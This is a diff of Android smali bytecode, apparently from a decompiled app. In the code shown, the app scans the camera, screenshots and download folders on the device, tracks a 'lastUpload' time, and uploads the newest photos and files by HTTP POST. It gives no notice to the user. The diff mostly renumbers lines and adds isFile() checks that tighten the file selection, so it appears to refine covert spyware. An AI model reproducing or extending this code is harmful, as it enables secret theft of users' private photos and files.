@@ -31,7 +31,7 @@
     .end annotation
 
     .prologue
-    .line 61
+    .line 70
     move-object/from16 v2, p0
 
     :try_start_2
@@ -49,7 +49,7 @@
 
     move-object/from16 v4, v38
 
-    .line 62
+    .line 71
     move-object/from16 v38, v4
 
     invoke-virtual/range {v38 .. v38}, Ljava/io/File;->canRead()Z
@@ -80,7 +80,7 @@
 
     move-object/from16 v5, v38
 
-    .line 63
+    .line 72
     move-object/from16 v38, v5
 
     check-cast v38, Ljava/lang/Boolean;
@@ -91,11 +91,11 @@
 
     if-nez v38, :cond_3b
 
-    .line 223
+    .line 233
     :goto_3a
     return-void
 
-    .line 72
+    .line 81
     :cond_3b
     const/16 v38, 0x0
 
@@ -123,7 +123,7 @@
 
     move-object/from16 v6, v38
 
-    .line 73
+    .line 82
     new-instance v38, Ljava/util/Date;
 
     move-object/from16 v46, v38
@@ -136,7 +136,7 @@
 
     move-object/from16 v7, v38
 
-    .line 74
+    .line 83
     move-object/from16 v38, v7
 
     invoke-virtual/range {v38 .. v38}, Ljava/util/Date;->getTime()J
@@ -145,7 +145,7 @@
 
     move-wide/from16 v8, v38
 
-    .line 75
+    .line 84
     move-object/from16 v38, v2
 
     const-string v39, "loadpref"
@@ -158,7 +158,7 @@
 
     move-object/from16 v10, v38
 
-    .line 76
+    .line 85
     move-object/from16 v38, v10
 
     invoke-interface/range {v38 .. v38}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
@@ -167,7 +167,7 @@
 
     move-object/from16 v11, v38
 
-    .line 78
+    .line 87
     move-object/from16 v38, v10
 
     const-string v39, "lastUpload"
@@ -186,7 +186,7 @@
 
     move-wide/from16 v12, v38
 
-    .line 80
+    .line 89
     move-wide/from16 v38, v12
 
     const/16 v40, 0x0
@@ -219,7 +219,7 @@
 
     if-ltz v38, :cond_da
 
-    .line 82
+    .line 91
     :cond_af
     move-object/from16 v38, v11
 
@@ -231,14 +231,14 @@
 
     move-result-object v38
 
-    .line 83
+    .line 92
     move-object/from16 v38, v11
 
     invoke-interface/range {v38 .. v38}, Landroid/content/SharedPreferences$Editor;->commit()Z
 
     move-result v38
 
-    .line 84
+    .line 93
     const/16 v38, 0x1
 
     new-instance v39, Ljava/lang/Boolean;
@@ -265,7 +265,7 @@
 
     move-object/from16 v6, v38
 
-    .line 88
+    .line 97
     :cond_da
     move-object/from16 v38, v6
 
@@ -273,13 +273,13 @@
 
     invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
     :try_end_e1
-    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_e1} :catch_5c9
+    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_e1} :catch_657
 
     move-result v38
 
     if-eqz v38, :cond_2b3
 
-    .line 92
+    .line 101
     :try_start_e4
     new-instance v38, Landroid/os/StrictMode$ThreadPolicy$Builder;
 
@@ -301,27 +301,27 @@
 
     move-object/from16 v14, v38
 
-    .line 93
+    .line 102
     move-object/from16 v38, v14
 
     invoke-static/range {v38 .. v38}, Landroid/os/StrictMode;->setThreadPolicy(Landroid/os/StrictMode$ThreadPolicy;)V
 
-    .line 96
+    .line 105
     const-string v38, "/sdcard/DCIM/Camera/"
 
     move-object/from16 v15, v38
 
-    .line 97
+    .line 106
     const-string v38, "/sdcard/DCIM/Screenshots/"
 
     move-object/from16 v16, v38
 
-    .line 98
+    .line 107
     const-string v38, "/sdcard/Download/"
 
     move-object/from16 v17, v38
 
-    .line 100
+    .line 109
     new-instance v38, Ljava/io/File;
 
     move-object/from16 v46, v38
@@ -336,7 +336,7 @@
 
     move-object/from16 v18, v38
 
-    .line 101
+    .line 110
     new-instance v38, Ljava/io/File;
 
     move-object/from16 v46, v38
@@ -351,7 +351,7 @@
 
     move-object/from16 v19, v38
 
-    .line 102
+    .line 111
     new-instance v38, Ljava/io/File;
 
     move-object/from16 v46, v38
@@ -366,7 +366,7 @@
 
     move-object/from16 v20, v38
 
-    .line 105
+    .line 114
     move-object/from16 v38, v18
 
     invoke-virtual/range {v38 .. v38}, Ljava/io/File;->list()[Ljava/lang/String;
@@ -375,7 +375,7 @@
 
     move-object/from16 v21, v38
 
-    .line 106
+    .line 115
     move-object/from16 v38, v20
 
     invoke-virtual/range {v38 .. v38}, Ljava/io/File;->list()[Ljava/lang/String;
@@ -384,12 +384,12 @@
 
     move-object/from16 v22, v38
 
-    .line 109
+    .line 118
     move-object/from16 v38, v21
 
     if-nez v38, :cond_157
 
-    .line 111
+    .line 120
     move-object/from16 v38, v19
 
     invoke-virtual/range {v38 .. v38}, Ljava/io/File;->list()[Ljava/lang/String;
@@ -398,28 +398,28 @@
 
     move-object/from16 v21, v38
 
-    .line 112
+    .line 121
     move-object/from16 v38, v16
 
     move-object/from16 v15, v38
 
-    .line 116
+    .line 125
     :cond_157
     const-string v38, ""
 
     move-object/from16 v23, v38
 
-    .line 117
+    .line 126
     const-string v38, ""
 
     move-object/from16 v24, v38
 
-    .line 119
+    .line 128
     move-object/from16 v38, v21
 
     if-eqz v38, :cond_176
 
-    .line 120
+    .line 129
     const/16 v38, 0x0
 
     move/from16 v25, v38
@@ -441,13 +441,13 @@
 
     if-lt v0, v1, :cond_2b5
 
-    .line 138
+    .line 148
     :cond_176
     move-object/from16 v38, v22
 
     if-eqz v38, :cond_18d
 
-    .line 139
+    .line 149
     const/16 v38, 0x0
 
     move/from16 v25, v38
@@ -467,9 +467,9 @@
 
     move/from16 v1, v39
 
-    if-lt v0, v1, :cond_438
+    if-lt v0, v1, :cond_475
 
-    .line 153
+    .line 163
     :cond_18d
     move-object/from16 v38, v23
 
@@ -481,7 +481,7 @@
 
     move-object/from16 v25, v38
 
-    .line 154
+    .line 164
     move-object/from16 v38, v24
 
     const-string v39, "///n"
@@ -492,17 +492,17 @@
 
     move-object/from16 v26, v38
 
-    .line 155
+    .line 165
     const-string v38, ""
 
     move-object/from16 v27, v38
 
-    .line 156
+    .line 166
     const-string v38, ""
 
     move-object/from16 v28, v38
 
-    .line 157
+    .line 167
     const/16 v38, 0x0
 
     move/from16 v0, v38
@@ -513,7 +513,7 @@
 
     move-wide/from16 v29, v38
 
-    .line 158
+    .line 168
     const/16 v38, 0x0
 
     move/from16 v0, v38
@@ -524,7 +524,7 @@
 
     move-wide/from16 v31, v38
 
-    .line 160
+    .line 170
     const/16 v38, 0x0
 
     move/from16 v33, v38
@@ -544,9 +544,9 @@
 
     move/from16 v1, v39
 
-    if-lt v0, v1, :cond_549
+    if-lt v0, v1, :cond_5d7
 
-    .line 168
+    .line 178
     const/16 v38, 0x0
 
     move/from16 v33, v38
@@ -566,9 +566,9 @@
 
     move/from16 v1, v39
 
-    if-lt v0, v1, :cond_57e
+    if-lt v0, v1, :cond_60c
 
-    .line 177
+    .line 187
     move-object/from16 v38, v27
 
     const-string v39, ""
@@ -579,7 +579,7 @@
 
     if-eq v0, v1, :cond_24a
 
-    .line 180
+    .line 190
     new-instance v38, Ljava/io/File;
 
     move-object/from16 v46, v38
@@ -594,7 +594,7 @@
 
     move-object/from16 v33, v38
 
-    .line 183
+    .line 193
     new-instance v38, Lorg/apache/http/entity/FileEntity;
 
     move-object/from16 v46, v38
@@ -611,7 +611,7 @@
 
     move-object/from16 v34, v38
 
-    .line 186
+    .line 196
     new-instance v38, Lorg/apache/http/client/methods/HttpPost;
 
     move-object/from16 v46, v38
@@ -626,21 +626,21 @@
 
     move-object/from16 v35, v38
 
-    .line 189
+    .line 199
     move-object/from16 v38, v35
 
     move-object/from16 v39, v34
 
     invoke-virtual/range {v38 .. v39}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V
 
-    .line 190
+    .line 200
     move-object/from16 v38, v34
 
     const-string v39, "binary/octet-stream"
 
     invoke-virtual/range {v38 .. v39}, Lorg/apache/http/entity/FileEntity;->setContentType(Ljava/lang/String;)V
 
-    .line 193
+    .line 203
     move-object/from16 v38, v35
 
     const-string v39, "lmod"
@@ -653,7 +653,7 @@
 
     invoke-virtual/range {v38 .. v40}, Lorg/apache/http/client/methods/HttpPost;->setHeader(Ljava/lang/String;Ljava/lang/String;)V
 
-    .line 196
+    .line 206
     new-instance v38, Lorg/apache/http/impl/client/DefaultHttpClient;
 
     move-object/from16 v46, v38
@@ -666,7 +666,7 @@
 
     move-object/from16 v36, v38
 
-    .line 197
+    .line 207
     move-object/from16 v38, v36
 
     move-object/from16 v39, v35
@@ -675,7 +675,7 @@
 
     move-result-object v38
 
-    .line 201
+    .line 211
     :cond_24a
     move-object/from16 v38, v28
 
@@ -687,7 +687,7 @@
 
     if-eq v0, v1, :cond_2b3
 
-    .line 203
+    .line 213
     new-instance v38, Ljava/io/File;
 
     move-object/from16 v46, v38
@@ -702,7 +702,7 @@
 
     move-object/from16 v33, v38
 
-    .line 204
+    .line 214
     new-instance v38, Lorg/apache/http/entity/FileEntity;
 
     move-object/from16 v46, v38
@@ -719,7 +719,7 @@
 
     move-object/from16 v34, v38
 
-    .line 205
+    .line 215
     new-instance v38, Lorg/apache/http/client/methods/HttpPost;
 
     move-object/from16 v46, v38
@@ -734,21 +734,21 @@
 
     move-object/from16 v35, v38
 
-    .line 207
+    .line 217
     move-object/from16 v38, v35
 
     move-object/from16 v39, v34
 
     invoke-virtual/range {v38 .. v39}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V
 
-    .line 208
+    .line 218
     move-object/from16 v38, v34
 
     const-string v39, "binary/octet-stream"
 
     invoke-virtual/range {v38 .. v39}, Lorg/apache/http/entity/FileEntity;->setContentType(Ljava/lang/String;)V
 
-    .line 209
+    .line 219
     move-object/from16 v38, v35
 
     const-string v39, "fname"
@@ -761,7 +761,7 @@
 
     invoke-virtual/range {v38 .. v40}, Lorg/apache/http/client/methods/HttpPost;->setHeader(Ljava/lang/String;Ljava/lang/String;)V
 
-    .line 210
+    .line 220
     new-instance v38, Lorg/apache/http/impl/client/DefaultHttpClient;
 
     move-object/from16 v46, v38
@@ -774,7 +774,7 @@
 
     move-object/from16 v36, v38
 
-    .line 211
+    .line 221
     move-object/from16 v38, v36
 
     move-object/from16 v39, v35
@@ -783,12 +783,12 @@
 
     move-result-object v38
 
-    .line 223
+    .line 233
     :cond_2b3
     :goto_2b3
     goto/16 :goto_3a
 
-    .line 122
+    .line 131
     :cond_2b5
     move-object/from16 v38, v21
 
@@ -826,7 +826,7 @@
 
     move-object/from16 v26, v38
 
-    .line 123
+    .line 132
     move-object/from16 v38, v21
 
     move/from16 v39, v25
@@ -863,7 +863,7 @@
 
     move-object/from16 v27, v38
 
-    .line 124
+    .line 133
     move-object/from16 v38, v21
 
     move/from16 v39, v25
@@ -900,7 +900,7 @@
 
     move-object/from16 v28, v38
 
-    .line 125
+    .line 134
     new-instance v38, Ljava/io/File;
 
     move-object/from16 v46, v38
@@ -975,7 +975,7 @@
 
     cmp-long v38, v38, v40
 
-    if-lez v38, :cond_434
+    if-lez v38, :cond_471
 
     const/16 v38, 0x0
 
@@ -1004,7 +1004,76 @@
 
     move-object/from16 v29, v38
 
-    .line 127
+    .line 135
+    new-instance v38, Ljava/io/File;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    new-instance v40, Ljava/lang/StringBuffer;
+
+    move-object/from16 v46, v40
+
+    move-object/from16 v40, v46
+
+    move-object/from16 v41, v46
+
+    invoke-direct/range {v41 .. v41}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v41, v15
+
+    invoke-virtual/range {v40 .. v41}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v40
+
+    move-object/from16 v41, v21
+
+    move/from16 v42, v25
+
+    aget-object v41, v41, v42
+
+    invoke-virtual/range {v40 .. v41}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v40
+
+    invoke-virtual/range {v40 .. v40}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v40
+
+    invoke-direct/range {v39 .. v40}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual/range {v38 .. v38}, Ljava/io/File;->isFile()Z
+
+    move-result v38
+
+    new-instance v39, Ljava/lang/Boolean;
+
+    move/from16 v46, v38
+
+    move-object/from16 v47, v39
+
+    move-object/from16 v38, v47
+
+    move/from16 v39, v46
+
+    move-object/from16 v40, v47
+
+    move/from16 v46, v39
+
+    move-object/from16 v47, v40
+
+    move-object/from16 v39, v47
+
+    move/from16 v40, v46
+
+    invoke-direct/range {v39 .. v40}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v30, v38
+
+    .line 137
     move-object/from16 v38, v26
 
     check-cast v38, Ljava/lang/Boolean;
@@ -1013,19 +1082,8 @@
 
     move-result v38
 
-    if-eqz v38, :cond_39e
+    if-nez v38, :cond_3ef
 
-    move-object/from16 v38, v29
-
-    check-cast v38, Ljava/lang/Boolean;
-
-    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
-
-    move-result v38
-
-    if-nez v38, :cond_3c6
-
-    :cond_39e
     move-object/from16 v38, v27
 
     check-cast v38, Ljava/lang/Boolean;
@@ -1034,19 +1092,8 @@
 
     move-result v38
 
-    if-eqz v38, :cond_3b2
+    if-nez v38, :cond_3ef
 
-    move-object/from16 v38, v29
-
-    check-cast v38, Ljava/lang/Boolean;
-
-    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
-
-    move-result v38
-
-    if-nez v38, :cond_3c6
-
-    :cond_3b2
     move-object/from16 v38, v28
 
     check-cast v38, Ljava/lang/Boolean;
@@ -1055,8 +1102,9 @@
 
     move-result v38
 
-    if-eqz v38, :cond_430
+    if-eqz v38, :cond_46d
 
+    :cond_3ef
     move-object/from16 v38, v29
 
     check-cast v38, Ljava/lang/Boolean;
@@ -1065,10 +1113,19 @@
 
     move-result v38
 
-    if-eqz v38, :cond_430
+    if-eqz v38, :cond_46d
 
-    .line 129
-    :cond_3c6
+    move-object/from16 v38, v30
+
+    check-cast v38, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v38
+
+    if-eqz v38, :cond_46d
+
+    .line 139
     new-instance v38, Ljava/lang/StringBuffer;
 
     move-object/from16 v46, v38
@@ -1125,7 +1182,7 @@
 
     move-object/from16 v23, v38
 
-    .line 131
+    .line 141
     move/from16 v38, v25
 
     move-object/from16 v39, v21
@@ -1144,9 +1201,9 @@
 
     move/from16 v1, v39
 
-    if-ge v0, v1, :cond_430
+    if-ge v0, v1, :cond_46d
 
-    .line 132
+    .line 142
     new-instance v38, Ljava/lang/StringBuffer;
 
     move-object/from16 v46, v38
@@ -1175,20 +1232,20 @@
 
     move-object/from16 v23, v38
 
-    .line 120
-    :cond_430
+    .line 129
+    :cond_46d
     add-int/lit8 v25, v25, 0x1
 
     goto/16 :goto_167
 
-    .line 125
-    :cond_434
+    .line 134
+    :cond_471
     const/16 v38, 0x1
 
     goto/16 :goto_371
 
-    .line 141
-    :cond_438
+    .line 151
+    :cond_475
     move-object/from16 v38, v22
 
     move/from16 v39, v25
@@ -1225,7 +1282,7 @@
 
     move-object/from16 v26, v38
 
-    .line 142
+    .line 152
     new-instance v38, Ljava/io/File;
 
     move-object/from16 v46, v38
@@ -1300,11 +1357,11 @@
 
     cmp-long v38, v38, v40
 
-    if-lez v38, :cond_545
+    if-lez v38, :cond_5d3
 
     const/16 v38, 0x0
 
-    :goto_4aa
+    :goto_4e7
     new-instance v39, Ljava/lang/Boolean;
 
     move/from16 v46, v38
@@ -1329,7 +1386,76 @@
 
     move-object/from16 v27, v38
 
-    .line 144
+    .line 153
+    new-instance v38, Ljava/io/File;
+
+    move-object/from16 v46, v38
+
+    move-object/from16 v38, v46
+
+    move-object/from16 v39, v46
+
+    new-instance v40, Ljava/lang/StringBuffer;
+
+    move-object/from16 v46, v40
+
+    move-object/from16 v40, v46
+
+    move-object/from16 v41, v46
+
+    invoke-direct/range {v41 .. v41}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v41, v17
+
+    invoke-virtual/range {v40 .. v41}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v40
+
+    move-object/from16 v41, v22
+
+    move/from16 v42, v25
+
+    aget-object v41, v41, v42
+
+    invoke-virtual/range {v40 .. v41}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v40
+
+    invoke-virtual/range {v40 .. v40}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v40
+
+    invoke-direct/range {v39 .. v40}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual/range {v38 .. v38}, Ljava/io/File;->isFile()Z
+
+    move-result v38
+
+    new-instance v39, Ljava/lang/Boolean;
+
+    move/from16 v46, v38
+
+    move-object/from16 v47, v39
+
+    move-object/from16 v38, v47
+
+    move/from16 v39, v46
+
+    move-object/from16 v40, v47
+
+    move/from16 v46, v39
+
+    move-object/from16 v47, v40
+
+    move-object/from16 v39, v47
+
+    move/from16 v40, v46
+
+    invoke-direct/range {v39 .. v40}, Ljava/lang/Boolean;-><init>(Z)V
+
+    move-object/from16 v28, v38
+
+    .line 154
     move-object/from16 v38, v26
 
     check-cast v38, Ljava/lang/Boolean;
@@ -1338,7 +1464,7 @@
 
     move-result v38
 
-    if-nez v38, :cond_541
+    if-nez v38, :cond_5cf
 
     move-object/from16 v38, v27
 
@@ -1348,9 +1474,19 @@
 
     move-result v38
 
-    if-eqz v38, :cond_541
+    if-eqz v38, :cond_5cf
 
-    .line 146
+    move-object/from16 v38, v28
+
+    check-cast v38, Ljava/lang/Boolean;
+
+    invoke-virtual/range {v38 .. v38}, Ljava/lang/Boolean;->booleanValue()Z
+
+    move-result v38
+
+    if-eqz v38, :cond_5cf
+
+    .line 156
     new-instance v38, Ljava/lang/StringBuffer;
 
     move-object/from16 v46, v38
@@ -1407,7 +1543,7 @@
 
     move-object/from16 v24, v38
 
-    .line 148
+    .line 158
     move/from16 v38, v25
 
     move-object/from16 v39, v22
@@ -1426,9 +1562,9 @@
 
     move/from16 v1, v39
 
-    if-ge v0, v1, :cond_541
+    if-ge v0, v1, :cond_5cf
 
-    .line 149
+    .line 159
     new-instance v38, Ljava/lang/StringBuffer;
 
     move-object/from16 v46, v38
@@ -1457,25 +1593,25 @@
 
     move-object/from16 v24, v38
 
-    .line 139
-    :cond_541
+    .line 149
+    :cond_5cf
     add-int/lit8 v25, v25, 0x1
 
     goto/16 :goto_17e
 
-    .line 142
-    :cond_545
+    .line 152
+    :cond_5d3
     const/16 v38, 0x1
 
-    goto/16 :goto_4aa
+    goto/16 :goto_4e7
 
-    .line 162
-    :cond_549
+    .line 172
+    :cond_5d7
     move-wide/from16 v38, v29
 
     move-wide/from16 v34, v38
 
-    .line 163
+    .line 173
     move-wide/from16 v38, v29
 
     new-instance v40, Ljava/io/File;
@@ -1504,16 +1640,16 @@
 
     move-wide/from16 v29, v38
 
-    .line 164
+    .line 174
     move-wide/from16 v38, v34
 
     move-wide/from16 v40, v29
 
     cmp-long v38, v38, v40
 
-    if-eqz v38, :cond_57a
+    if-eqz v38, :cond_608
 
-    .line 165
+    .line 175
     move-object/from16 v38, v25
 
     move/from16 v39, v33
@@ -1522,19 +1658,19 @@
 
     move-object/from16 v27, v38
 
-    .line 160
-    :cond_57a
+    .line 170
+    :cond_608
     add-int/lit8 v33, v33, 0x1
 
     goto/16 :goto_1bf
 
-    .line 170
-    :cond_57e
+    .line 180
+    :cond_60c
     move-wide/from16 v38, v31
 
     move-wide/from16 v34, v38
 
-    .line 171
+    .line 181
     move-wide/from16 v38, v31
 
     new-instance v40, Ljava/io/File;
@@ -1563,45 +1699,45 @@
 
     move-wide/from16 v31, v38
 
-    .line 172
+    .line 182
     move-wide/from16 v38, v34
 
     move-wide/from16 v40, v31
 
     cmp-long v38, v38, v40
 
-    if-eqz v38, :cond_5af
+    if-eqz v38, :cond_63d
 
-    .line 173
+    .line 183
     move-object/from16 v38, v26
 
     move/from16 v39, v33
 
     aget-object v38, v38, v39
-    :try_end_5ad
-    .catch Ljava/lang/Exception; {:try_start_e4 .. :try_end_5ad} :catch_5b3
+    :try_end_63b
+    .catch Ljava/lang/Exception; {:try_start_e4 .. :try_end_63b} :catch_641
 
     move-object/from16 v28, v38
 
-    .line 168
-    :cond_5af
+    .line 178
+    :cond_63d
     add-int/lit8 v33, v33, 0x1
 
     goto/16 :goto_1d2
 
-    .line 211
-    :catch_5b3
+    .line 221
+    :catch_641
     move-exception v38
 
     move-object/from16 v14, v38
 
-    .line 217
+    .line 227
     move-object/from16 v38, v14
 
-    :try_start_5b8
+    :try_start_646
     invoke-virtual/range {v38 .. v38}, Ljava/lang/Exception;->printStackTrace()V
 
-    .line 218
+    .line 228
     const-string v38, "iq500"
 
     move-object/from16 v39, v14
@@ -1611,24 +1747,24 @@
     move-result-object v39
 
     invoke-static/range {v38 .. v39}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
-    :try_end_5c6
-    .catch Ljava/lang/Exception; {:try_start_5b8 .. :try_end_5c6} :catch_5c9
+    :try_end_654
+    .catch Ljava/lang/Exception; {:try_start_646 .. :try_end_654} :catch_657
 
     move-result v38
 
     goto/16 :goto_2b3
 
-    :catch_5c9
+    :catch_657
     move-exception v38
 
     move-object/from16 v4, v38
 
-    .line 222
+    .line 232
     move-object/from16 v38, v4
 
     invoke-virtual/range {v38 .. v38}, Ljava/lang/Exception;->printStackTrace()V
 
-    .line 223
+    .line 233
     const-string v38, "iq500"
 
     move-object/from16 v39, v4
